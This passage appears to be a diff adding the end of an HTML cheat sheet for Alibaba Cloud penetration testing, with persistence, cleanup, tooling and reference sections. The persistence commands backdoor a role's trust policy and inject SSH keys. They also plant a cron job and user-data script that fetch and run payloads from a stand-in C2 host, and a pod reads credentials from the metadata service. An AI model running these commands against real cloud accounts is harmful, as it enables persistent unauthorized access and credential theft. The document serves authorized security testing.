+    <div class="card">
+      <div class="card-header" onclick="toggleCard(this)">
+        <span class="card-title">🎭 Backdoor RAM Role (Trust Policy Modification)</span>
+        <span class="chevron">▼</span>
+      </div>
+      <div class="card-body">
+        <p class="desc">Modify a privileged role's trust policy to allow assumption from an attacker-controlled account or RAM user — persistent even if original credentials are rotated.</p>
+        <div class="cmd-block">
+          <span class="cmd-label">Add external account to a role's trust policy</span>
+          <pre class="cmd-text"># Create updated trust policy allowing attacker account to assume this role:
+aliyun ram UpdateRole \
+  --RoleName &lt;TARGET_ROLE&gt; \
+  --NewAssumeRolePolicyDocument '{
+    "Version": "1",
+    "Statement": [
+      {
+        "Effect": "Allow",
+        "Principal": {
+          "RAM": [
+            "acs:ram::&lt;ORIGINAL_ACCOUNT&gt;:root",
+            "acs:ram::&lt;ATTACKER_ACCOUNT&gt;:root"
+          ]
+        },
+        "Action": "sts:AssumeRole"
+      }
+    ]
+  }'</pre>
+          <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        </div>
+        <div class="cmd-block">
+          <span class="cmd-label">Assume backdoored role from attacker account</span>
+          <pre class="cmd-text">aliyun --profile attacker-account sts AssumeRole \
+  --RoleArn acs:ram::&lt;TARGET_ACCOUNT&gt;:role/&lt;ROLE_NAME&gt; \
+  --RoleSessionName persistence \
+  --DurationSeconds 43200</pre>
+          <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        </div>
+      </div>
+    </div>
+
+    <div class="card">
+      <div class="card-header" onclick="toggleCard(this)">
+        <span class="card-title">🖥 ECS-Level Persistence</span>
+        <span class="chevron">▼</span>
+      </div>
+      <div class="card-body">
+        <div class="cmd-block">
+          <span class="cmd-label">Inject SSH key via Cloud Assistant</span>
+          <pre class="cmd-text">aliyun ecs RunCommand \
+  --RegionId cn-hangzhou \
+  --InstanceIds '["i-xxxxxxxxxxxxxxxx"]' \
+  --Type RunShellScript \
+  --CommandContent "echo 'ssh-rsa AAAA...your-key' >> /root/.ssh/authorized_keys" \
+  --Username root</pre>
+          <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        </div>
+        <div class="cmd-block">
+          <span class="cmd-label">Plant cron job via Cloud Assistant</span>
+          <pre class="cmd-text">aliyun ecs RunCommand \
+  --RegionId cn-hangzhou \
+  --InstanceIds '["i-xxxxxxxxxxxxxxxx"]' \
+  --Type RunShellScript \
+  --CommandContent "echo '*/5 * * * * root curl -s http://your-c2.com/beacon | bash' >> /etc/crontab" \
+  --Username root</pre>
+          <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        </div>
+        <div class="cmd-block">
+          <span class="cmd-label">Modify user-data for persistence on reboot (API-level)</span>
+          <pre class="cmd-text"># User-data runs on instance start (cloud-init)
+# Encode your script in base64:
+B64=$(echo '#!/bin/bash
+curl -s http://your-c2.com/implant -o /tmp/.svc && chmod +x /tmp/.svc && /tmp/.svc &' | base64 -w 0)
+
+aliyun ecs ModifyUserData \
+  --InstanceId i-xxxxxxxxxxxxxxxx \
+  --UserData "$B64"</pre>
+          <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        </div>
+        <div class="cmd-block">
+          <span class="cmd-label">Create a custom ECS image with implant baked in</span>
+          <pre class="cmd-text"># After planting implant on instance, create a custom image:
+aliyun ecs CreateImage \
+  --RegionId cn-hangzhou \
+  --InstanceId i-xxxxxxxxxxxxxxxx \
+  --ImageName "ubuntu-20-base-v2" \
+  --Description "Updated base image"
+# If this image is used for future instance launches, the implant persists</pre>
+          <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        </div>
+      </div>
+    </div>
+
+    <div class="card">
+      <div class="card-header" onclick="toggleCard(this)">
+        <span class="card-title">🧹 Cleanup Checklist (Post-Engagement)</span>
+        <span class="chevron">▼</span>
+      </div>
+      <div class="card-body">
+        <div class="cmd-block">
+          <span class="cmd-label">Remove backdoor RAM user and keys</span>
+          <pre class="cmd-text"># Delete access keys first:
+aliyun ram DeleteAccessKey \
+  --UserName svc-monitoring-agent \
+  --UserAccessKeyId &lt;AK_TO_DELETE&gt;
+
+# Remove policy attachments:
+aliyun ram DetachPolicyFromUser \
+  --PolicyType System \
+  --PolicyName AdministratorAccess \
+  --UserName svc-monitoring-agent
+
+# Delete the user:
+aliyun ram DeleteUser --UserName svc-monitoring-agent</pre>
+          <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        </div>
+        <div class="cmd-block">
+          <span class="cmd-label">Revert role trust policy modifications</span>
+          <pre class="cmd-text">aliyun ram UpdateRole \
+  --RoleName &lt;TARGET_ROLE&gt; \
+  --NewAssumeRolePolicyDocument '&lt;ORIGINAL_TRUST_POLICY&gt;'</pre>
+          <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        </div>
+        <div class="cmd-block">
+          <span class="cmd-label">Remove injected SSH keys and cron jobs</span>
+          <pre class="cmd-text">aliyun ecs RunCommand \
+  --RegionId cn-hangzhou \
+  --InstanceIds '["i-xxxxxxxxxxxxxxxx"]' \
+  --Type RunShellScript \
+  --CommandContent "sed -i '/your-key-comment/d' /root/.ssh/authorized_keys; \
+    sed -i '/your-c2.com/d' /etc/crontab" \
+  --Username root</pre>
+          <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        </div>
+        <div class="cmd-block">
+          <span class="cmd-label">Remove key pairs and snapshots created during testing</span>
+          <pre class="cmd-text">aliyun ecs DeleteKeyPairs --KeyPairNames '["pentest-key"]' --RegionId cn-hangzhou
+aliyun ecs DeleteSnapshot --SnapshotId s-xxxxxxxxxxxxxxxx --RegionId cn-hangzhou</pre>
+          <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <!-- ═══════════════════════════════════ TOOLS ════════════════ -->
+  <section class="section" id="tools">
+    <div class="section-header">
+      <div class="section-icon" style="background:rgba(46,204,113,0.12)">🧰</div>
+      <span class="section-title">Tools & Automation</span>
+      <span class="section-id">#14</span>
+    </div>
+
+    <div class="card">
+      <div class="card-header" onclick="toggleCard(this)">
+        <span class="card-title">📊 ActionTrail — Audit Logs</span>
+        <span class="chevron">▼</span>
+      </div>
+      <div class="card-body open">
+        <p class="desc">ActionTrail is Alibaba Cloud's equivalent to AWS CloudTrail — audit logs for all API calls. Check for: logging disabled, logs sent to insecure bucket, log tampering.</p>
+        <div class="cmd-block">
+          <span class="cmd-label">List trails</span>
+          <pre class="cmd-text">aliyun actiontrail DescribeTrails</pre>
+          <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        </div>
+        <div class="cmd-block">
+          <span class="cmd-label">Get trail status (is logging enabled?)</span>
+          <pre class="cmd-text">aliyun actiontrail GetTrailStatus --Name &lt;TRAIL_NAME&gt;</pre>
+          <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        </div>
+        <p class="danger">If no trails exist, or trail logging is disabled, API activity is not being logged — evasion is possible.</p>
+      </div>
+    </div>
+
+    <div class="card">
+      <div class="card-header" onclick="toggleCard(this)">
+        <span class="card-title">🔭 CloudMonitor & Security Center</span>
+        <span class="chevron">▼</span>
+      </div>
+      <div class="card-body">
+        <div class="cmd-block">
+          <span class="cmd-label">List alarm rules (what monitoring exists)</span>
+          <pre class="cmd-text">aliyun cms DescribeAlarmHistory --RegionId cn-hangzhou</pre>
+          <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        </div>
+        <div class="cmd-block">
+          <span class="cmd-label">Check Security Center (Threat Detection Service)</span>
+          <pre class="cmd-text"># Security Center is GUI-based (sas.aliyuncs.com)
+# Via CLI — check if threat detection agent is installed on ECS:
+aliyun ecs DescribeInstances | jq '.Instances.Instance[].CloudAssistantStatus'</pre>
+          <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        </div>
+      </div>
+    </div>
+
+    <div class="card">
+      <div class="card-header" onclick="toggleCard(this)">
+        <span class="card-title">🐳 ACK — Container Service for Kubernetes</span>
+        <span class="chevron">▼</span>
+      </div>
+      <div class="card-body">
+        <div class="cmd-block">
+          <span class="cmd-label">List Kubernetes clusters</span>
+          <pre class="cmd-text">aliyun cs DescribeClusters
+aliyun cs GET /clusters</pre>
+          <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        </div>
+        <div class="cmd-block">
+          <span class="cmd-label">Get cluster kubeconfig (if permitted)</span>
+          <pre class="cmd-text">aliyun cs GET /k8s/&lt;CLUSTER_ID&gt;/user_config</pre>
+          <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        </div>
+        <div class="cmd-block">
+          <span class="cmd-label">IMDS from within a K8s pod (check RRSA vs direct role)</span>
+          <pre class="cmd-text"># From inside a pod, check if direct ECS IMDS is accessible:
+curl http://100.100.100.200/latest/meta-data/ram/security-credentials/
+
+# Or check RRSA (RAM Roles for Service Accounts) token:
+cat /var/run/secrets/kubernetes.io/serviceaccount/token
+env | grep ALIBABA</pre>
+          <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        </div>
+        <p class="note">In ACK clusters, worker nodes have ECS RAM roles. If RRSA is not enforced, pods can steal node-level credentials via IMDS.</p>
+      </div>
+    </div>
+
+    <div class="card">
+      <div class="card-header" onclick="toggleCard(this)">
+        <span class="card-title">🔧 Useful Utility Commands</span>
+        <span class="chevron">▼</span>
+      </div>
+      <div class="card-body">
+        <div class="cmd-block">
+          <span class="cmd-label">Output as JSON + jq parsing</span>
+          <pre class="cmd-text">aliyun ram ListUsers | jq '.Users.User[] | {UserName, DisplayName, CreateDate}'
+aliyun ecs DescribeInstances | jq '.Instances.Instance[] | .PublicIpAddress.IpAddress[]'</pre>
+          <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        </div>
+        <div class="cmd-block">
+          <span class="cmd-label">Paginate large results</span>
+          <pre class="cmd-text">aliyun ram ListUsers --Marker &lt;MARKER_FROM_PREV_RESULT&gt; --MaxItems 100
+# Use IsTruncated=true + Marker value from response to get next page</pre>
+          <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        </div>
+        <div class="cmd-block">
+          <span class="cmd-label">Force API call (bypass CLI validation)</span>
+          <pre class="cmd-text">aliyun --force ecs &lt;UnknownAPI&gt; --param1 value1</pre>
+          <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        </div>
+        <div class="cmd-block">
+          <span class="cmd-label">Get API help for any service</span>
+          <pre class="cmd-text">aliyun ecs --help
+aliyun ram ListUsers --help
+aliyun &lt;service&gt; &lt;API&gt; --help</pre>
+          <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <!-- ═══════════════════════════════════ REFERENCE ════════════ -->
+  <section class="section" id="reference">
+    <div class="section-header">
+      <div class="section-icon" style="background:rgba(232,93,4,0.12)">📖</div>
+      <span class="section-title">Quick Reference</span>
+      <span class="section-id">#15</span>
+    </div>
+
+    <div class="card">
+      <div class="card-header" onclick="toggleCard(this)">
+        <span class="card-title">🗺 Service Name Mapping (AWS ↔ Alibaba Cloud)</span>
+        <span class="chevron">▼</span>
+      </div>
+      <div class="card-body open">
+        <table class="ref-table">
+          <thead><tr><th>AWS Service</th><th>Alibaba Cloud Equivalent</th><th>CLI Prefix</th></tr></thead>
+          <tbody>
+            <tr><td>EC2</td><td>ECS (Elastic Compute Service)</td><td class="mono">aliyun ecs</td></tr>
+            <tr><td>S3</td><td>OSS (Object Storage Service)</td><td class="mono">aliyun oss / ossutil</td></tr>
+            <tr><td>IAM</td><td>RAM (Resource Access Management)</td><td class="mono">aliyun ram</td></tr>
+            <tr><td>STS</td><td>STS (Security Token Service)</td><td class="mono">aliyun sts</td></tr>
+            <tr><td>RDS</td><td>ApsaraDB RDS</td><td class="mono">aliyun rds</td></tr>
+            <tr><td>VPC</td><td>VPC (Virtual Private Cloud)</td><td class="mono">aliyun vpc</td></tr>
+            <tr><td>ELB/ALB</td><td>SLB (Server Load Balancer) / ALB</td><td class="mono">aliyun slb</td></tr>
+            <tr><td>CloudTrail</td><td>ActionTrail</td><td class="mono">aliyun actiontrail</td></tr>
+            <tr><td>CloudWatch</td><td>CloudMonitor</td><td class="mono">aliyun cms</td></tr>
+            <tr><td>KMS</td><td>KMS (Key Management Service)</td><td class="mono">aliyun kms</td></tr>
+            <tr><td>Secrets Manager</td><td>Secrets Manager (via KMS)</td><td class="mono">aliyun kms</td></tr>
+            <tr><td>EKS</td><td>ACK (Container Service for K8s)</td><td class="mono">aliyun cs</td></tr>
+            <tr><td>Lambda</td><td>Function Compute (FC)</td><td class="mono">aliyun fc</td></tr>
+            <tr><td>GuardDuty / Security Hub</td><td>Security Center (SAS)</td><td>Console only</td></tr>
+            <tr><td>Route 53</td><td>Alibaba Cloud DNS</td><td class="mono">aliyun dns</td></tr>
+            <tr><td>CloudFormation</td><td>Resource Orchestration Service (ROS)</td><td class="mono">aliyun ros</td></tr>
+            <tr><td>Redis (ElastiCache)</td><td>ApsaraDB for Redis</td><td class="mono">aliyun r-kvstore</td></tr>
+          </tbody>
+        </table>
+      </div>
+    </div>
+
+    <div class="card">
+      <div class="card-header" onclick="toggleCard(this)">
+        <span class="card-title">🏷 High-Risk System Policies</span>
+        <span class="chevron">▼</span>
+      </div>
+      <div class="card-body open">
+        <table class="ref-table">
+          <thead><tr><th>Policy Name</th><th>Risk</th><th>Notes</th></tr></thead>
+          <tbody>
+            <tr><td class="mono highlight">AdministratorAccess</td><td style="color:var(--red)">CRITICAL</td><td>Full control of ALL resources</td></tr>
+            <tr><td class="mono highlight">AliyunRAMFullAccess</td><td style="color:var(--red)">CRITICAL</td><td>Manage all RAM users, roles, policies → total account takeover path</td></tr>
+            <tr><td class="mono highlight">AliyunSTSAssumeRoleAccess</td><td style="color:var(--yellow)">HIGH</td><td>Can call AssumeRole on any role</td></tr>
+            <tr><td class="mono">AliyunECSFullAccess</td><td style="color:var(--yellow)">HIGH</td><td>Create/modify ECS, attach RAM roles</td></tr>
+            <tr><td class="mono">AliyunOSSFullAccess</td><td style="color:var(--yellow)">HIGH</td><td>Read/write all OSS buckets</td></tr>
+            <tr><td class="mono">AliyunRDSFullAccess</td><td style="color:var(--yellow)">HIGH</td><td>Access all databases</td></tr>
+            <tr><td class="mono">AliyunKMSFullAccess</td><td style="color:var(--yellow)">HIGH</td><td>Access all encryption keys and secrets</td></tr>
+            <tr><td class="mono">AliyunECSReadOnlyAccess</td><td style="color:var(--green)">LOW</td><td>Read-only ECS (safe)</td></tr>
+          </tbody>
+        </table>
+      </div>
+    </div>
+
+    <div class="card">
+      <div class="card-header" onclick="toggleCard(this)">
+        <span class="card-title">🔗 Key URLs & Endpoints</span>
+        <span class="chevron">▼</span>
+      </div>
+      <div class="card-body">
+        <table class="ref-table">
+          <thead><tr><th>Resource</th><th>URL / Endpoint</th></tr></thead>
+          <tbody>
+            <tr><td>Console</td><td class="mono">https://ecs.console.aliyun.com</td></tr>
+            <tr><td>RAM Console</td><td class="mono">https://ram.console.aliyun.com</td></tr>
+            <tr><td>RAM Login URL</td><td class="mono">https://signin.alibabacloud.com/&lt;ACCOUNT_ALIAS&gt;/login</td></tr>
+            <tr><td>RAM User Login</td><td class="mono">https://&lt;ACCOUNT_ID&gt;.signin.aliyun.com/login</td></tr>
+            <tr><td>IMDS Endpoint</td><td class="mono">http://100.100.100.200</td></tr>
+            <tr><td>STS Endpoint</td><td class="mono">https://sts.aliyuncs.com</td></tr>
+            <tr><td>OpenAPI Explorer</td><td class="mono">https://api.aliyun.com/api-tools/</td></tr>
+            <tr><td>CLI GitHub</td><td class="mono">https://github.com/aliyun/aliyun-cli</td></tr>
+          </tbody>
+        </table>
+      </div>
+    </div>
+
+    <div class="card">
+      <div class="card-header" onclick="toggleCard(this)">
+        <span class="card-title">📋 Engagement Checklist</span>
+        <span class="chevron">▼</span>
+      </div>
+      <div class="card-body">
+        <div id="checklist"></div>
+      </div>
+    </div>
+  </section>
+
+</main>
+
+<script>
+// Sidebar toggle
+const toggleBtn = document.getElementById('toggle-sidebar');
+const sidebar = document.getElementById('sidebar');
+toggleBtn.addEventListener('click', () => {
+  sidebar.classList.toggle('collapsed');
+  toggleBtn.textContent = sidebar.classList.contains('collapsed') ? '▶' : '☰';
+  toggleBtn.style.left = sidebar.classList.contains('collapsed') ? '12px' : '12px';
+});
+
+// Load nav from JSON island
+const data = JSON.parse(document.getElementById('cheatsheet-data').textContent);
+
+// Build nav
+const navContainer = document.getElementById('nav-links');
+navContainer.innerHTML = '<div class="nav-section-label">Sections</div>';
+data.nav.forEach(item => {
+  const a = document.createElement('a');
+  a.className = 'nav-item';
+  a.href = '#' + item.id;
+  a.dataset.target = item.id;
+  a.innerHTML = `<span class="nav-dot" style="background:${item.dot}"></span>${item.label}`;
+  a.addEventListener('click', e => {
+    document.querySelectorAll('.nav-item').forEach(n => n.classList.remove('active'));
+    a.classList.add('active');
+  });
+  navContainer.appendChild(a);
+});
+
+// Toggle card open/close
+function toggleCard(header) {
+  const body = header.nextElementSibling;
+  const chevron = header.querySelector('.chevron');
+  if (body.classList.contains('open')) {
+    body.classList.remove('open');
+    chevron.style.transform = 'rotate(-90deg)';
+  } else {
+    body.classList.add('open');
+    chevron.style.transform = '';
+  }
+}
+
+// Copy command
+function copyCmd(btn) {
+  const pre = btn.parentElement.querySelector('.cmd-text');
+  navigator.clipboard.writeText(pre.innerText).then(() => {
+    btn.textContent = 'COPIED!';
+    btn.classList.add('copied');
+    setTimeout(() => { btn.textContent = 'COPY'; btn.classList.remove('copied'); }, 1800);
+  });
+}
+
+// Search
+const searchInput = document.getElementById('search');
+const filterNotice = document.getElementById('filter-notice');
+searchInput.addEventListener('input', () => {
+  const q = searchInput.value.toLowerCase().trim();
+  if (!q) {
+    document.querySelectorAll('.card').forEach(c => c.classList.remove('hidden'));
+    document.querySelectorAll('.section').forEach(s => s.classList.remove('hidden'));
+    filterNotice.style.display = 'none';
+    return;
+  }
+  let total = 0;
+  document.querySelectorAll('.card').forEach(card => {
+    const text = card.textContent.toLowerCase();
+    if (text.includes(q)) {
+      card.classList.remove('hidden');
+      card.querySelector('.card-body').classList.add('open');
+      total++;
+    } else {
+      card.classList.add('hidden');
+    }
+  });
+  document.querySelectorAll('.section').forEach(section => {
+    const visible = [...section.querySelectorAll('.card')].some(c => !c.classList.contains('hidden'));
+    section.classList.toggle('hidden', !visible);
+  });
+  filterNotice.style.display = 'block';
+  filterNotice.textContent = `Showing ${total} result${total !== 1 ? 's' : ''} for "${searchInput.value}"`;
+});
+
+// Active nav on scroll
+const sections = document.querySelectorAll('.section');
+const observer = new IntersectionObserver((entries) => {
+  entries.forEach(e => {
+    if (e.isIntersecting) {
+      document.querySelectorAll('.nav-item').forEach(n => n.classList.remove('active'));
+      const target = document.querySelector(`.nav-item[data-target="${e.target.id}"]`);
+      if (target) target.classList.add('active');
+    }
+  });
+}, { threshold: 0.2 });
+sections.forEach(s => observer.observe(s));
+
+// Build checklist
+const checks = [
+  "Verified scope and obtained penetration test permission in Alibaba Cloud console",
+  "Confirmed identity (GetCallerIdentity) and access level",
+  "Enumerated all regions for ECS instances, RDS, OSS buckets",
+  "Listed all RAM users, groups, roles, and their policies",
+  "Identified users without MFA with console access",
+  "Checked for AdministratorAccess or AliyunRAMFullAccess assignments",
+  "Tested IMDS endpoint (100.100.100.200) — check if hardening mode enabled",
+  "Checked user-data for secrets/credentials",
+  "Enumerated OSS buckets — checked for public-read/public-read-write ACLs",
+  "Checked OSS bucket policies, CORS, and encryption status",
+  "Reviewed security group rules for 0.0.0.0/0 on sensitive ports",
+  "Checked RDS whitelist for 0.0.0.0/0 and public connection strings",
+  "Verified ActionTrail is configured and logging is enabled",
+  "Checked KMS keys and any stored Secrets Manager secrets",
+  "Tested sts:AssumeRole for privilege escalation paths",
+  "Reviewed trust policies on all RAM roles for overly broad conditions",
+  "Checked ~/.aliyun/config.json and env vars on any compromised hosts",
+  "Ran ScoutSuite for automated misconfiguration scanning"
+];
+const cl = document.getElementById('checklist');
+checks.forEach((item, i) => {
+  const label = document.createElement('label');
+  label.style.cssText = 'display:flex;gap:10px;align-items:flex-start;padding:5px 0;cursor:pointer;font-size:12px;color:#8a9ab0;border-bottom:1px solid #0d1318;';
+  const cb = document.createElement('input');
+  cb.type = 'checkbox';
+  cb.style.cssText = 'margin-top:2px;accent-color:#e85d04;flex-shrink:0;';
+  const savedState = localStorage.getItem('aliyun-check-' + i);
+  if (savedState === 'true') cb.checked = true;
+  cb.addEventListener('change', () => {
+    localStorage.setItem('aliyun-check-' + i, cb.checked);
+    label.style.color = cb.checked ? '#3a9e6a' : '#8a9ab0';
+    label.style.textDecoration = cb.checked ? 'line-through' : 'none';
+  });
+  if (cb.checked) {
+    label.style.color = '#3a9e6a';
+    label.style.textDecoration = 'line-through';
+  }
+  label.appendChild(cb);
+  label.appendChild(document.createTextNode(item));
+  cl.appendChild(label);
+});
+</script>
+</body>
+</html>
